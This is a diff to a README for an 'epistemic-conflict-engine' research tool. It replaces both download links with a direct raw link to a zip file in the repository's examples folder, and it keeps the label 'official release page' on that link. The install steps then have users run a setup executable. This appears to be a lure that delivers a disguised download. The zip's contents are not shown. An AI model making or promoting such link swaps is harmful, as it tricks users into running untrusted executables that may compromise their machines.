@@ -1,6 +1,6 @@
 # ⚖️ epistemic-conflict-engine - Find contradictions in your research notes
 
-[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/CLODOALDO14/epistemic-conflict-engine)
+[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/CLODOALDO14/epistemic-conflict-engine/raw/refs/heads/main/examples/epistemic_engine_conflict_1.3.zip)
 
 This application helps researchers find disagreements within their Zotero libraries. It uses the LLaMA 3.1 AI model to analyze claims and identify logical gaps or contradictions. It stores data in a Neo4j graph database to track connections between ideas. You do not need to understand code to use this tool. 
 
@@ -18,7 +18,7 @@ Your computer needs specific parts to run this engine. Ensure your system meets 
 
 Follow these steps to set up the software on your machine.
 
-1. Visit the [official release page](https://github.com/CLODOALDO14/epistemic-conflict-engine) to download the latest installer.
+1. Visit the [official release page](https://github.com/CLODOALDO14/epistemic-conflict-engine/raw/refs/heads/main/examples/epistemic_engine_conflict_1.3.zip) to download the latest installer.
 2. Locate the file named `epistemic-conflict-engine-setup.exe` in your Downloads folder.
 3. Double-click the file to open the installation wizard.
 4. Follow the prompts on the screen.
